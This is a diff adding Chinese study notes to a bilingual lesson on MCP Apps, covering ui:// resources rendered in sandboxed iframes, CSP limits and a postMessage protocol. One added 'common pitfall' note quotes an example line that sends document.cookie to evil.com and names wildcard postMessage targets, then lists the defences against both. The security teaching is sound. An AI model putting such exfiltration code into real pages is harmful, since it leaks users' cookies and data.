@@ -6,6 +6,8 @@
 
 > **【拓展】** MCP Apps 是 MCP 协议从"工具调用"走向"应用平台"的关键一步。类似于微信小程序之于微信，MCP Apps 让 MCP 服务器能提供完整的交互式用户体验。Claude 协议生态中的 AppRenderer（服务端）和 AppFrame（客户端）SDK 原语进一步简化了开发。
 
+> 🔗 **【前置】** 学本节前请先掌握：(1) Phase 13·07（MCP server）和 13·10（resources）——`ui://` 是 resource 的一种特殊 scheme；(2) HTML/CSS/JS 基础；(3) iframe sandbox、CSP（Content Security Policy）、postMessage API——本节重度依赖它们做安全沙盒。
+
 **Type:** Build | **类型:** 构建
 **Languages:** Python (stdlib, UI resource emitter), HTML (sample app) | **语言:** Python (stdlib, UI resource emitter), HTML (sample app)
 **Prerequisites:** Phase 13 · 07 (MCP server), Phase 13 · 10 (resources) | **前置知识:** Phase 13 · 07 (MCP server), Phase 13 · 10 (resources)
@@ -38,6 +40,8 @@ MCP Apps (SEP-1724, shipped January 26, 2026) standardize the contract. A tool r
 Every compatible client (Claude Desktop, ChatGPT, Goose, VS Code) renders the same `ui://` resource the same way. One server, one HTML bundle, universal UI.
 
 > 每个兼容客户端（Claude Desktop、ChatGPT、Goose、VS Code）以相同方式渲染相同的 `ui://` 资源。一个服务器、一个 HTML 包、通用 UI。
+
+> 💡 **【类比】** MCP Apps 像"AI 助手版微信小程序"。微信小程序之前：开发者要给 iOS/Android/网页各写一遍。小程序后：写一次，微信内通用。MCP Apps 之前：可视化 UI 要给 Claude/ChatGPT/Cursor 各写一遍（Claude artifacts、GPT custom HTML、Cursor widget）。MCP Apps 后：写一个 HTML bundle 返回 `ui://` 资源，所有兼容 client 都能渲染。安全模型也类似——沙盒 iframe + 受限 CSP = 小程序的"受限运行环境"。
 
 ## The Concept | 核心概念
 
@@ -100,6 +104,8 @@ The host renders the HTML inside a sandboxed `<iframe>` with:
 - Network access limited to `connectSrc` in CSP.
   中文翻译：网络访问限制为 CSP 中的 `connectSrc`。
 
+> ⚠️ **【易错点】** 场景：MCP App HTML 里写 `fetch("https://evil.com/exfil?" + document.cookie)` 或 `window.parent.postMessage({...}, "*")` 用通配 target / 后果：用户数据外泄或被恶意页面接收敏感消息 / 修复：(1) CSP 必须设 `default-src 'self'`、`connect-src` 白名单；(2) postMessage 永远指定精确 targetOrigin 而非 `"*"`；(3) `sandbox` 属性禁止 `allow-top-navigation` 防重定向；(4) 服务端声明 CSP 在 `_meta.ui.csp` 并经客户端校验不能放宽。
+
 ### postMessage protocol
 
 > **【中文解读】** postMessage 协议：iframe 通过 `window.postMessage` 与宿主通信，使用微型 JSON-RPC 2.0 方言。可用的宿主方法包括 `host.callTool`（调用工具）、`host.readResource`（读取资源）、`host.getPrompt`（获取提示词）、`host.close`（关闭 UI）。每项调用仍通过 MCP 协议并继承服务器权限。
@@ -107,6 +113,8 @@ The host renders the HTML inside a sandboxed `<iframe>` with:
 The iframe communicates with the host via `window.postMessage`. A tiny JSON-RPC 2.0 dialect:
 
 > iframe 通过 `window.postMessage` 与宿主通信。一个微型 JSON-RPC 2.0 方言：
+
+> 🤔 **【困惑】** Q: 既然 MCP Apps 能渲染任意 HTML，是不是等于把 server 的代码搬到 client 跑？太危险了吧？ A: 危险可控，关键在沙盒。iframe 的 `sandbox` 属性禁止访问宿主 cookie/storage/DOM；CSP 限定能联网的域名；postMessage 是唯一与宿主通信的通道且每个调用都走 MCP 权限校验（host.callTool 仍按 server 权限）。本质和浏览器跑任意网站的风险类似——sandbox 是核心防线，不是信任。
 
 Always pin `targetOrigin` to the peer's exact origin, and on the receiving side validate `event.origin` against an allowlist before processing any payload. Never use `"*"` for either side of this channel — the body carries tool calls and resource reads.
 
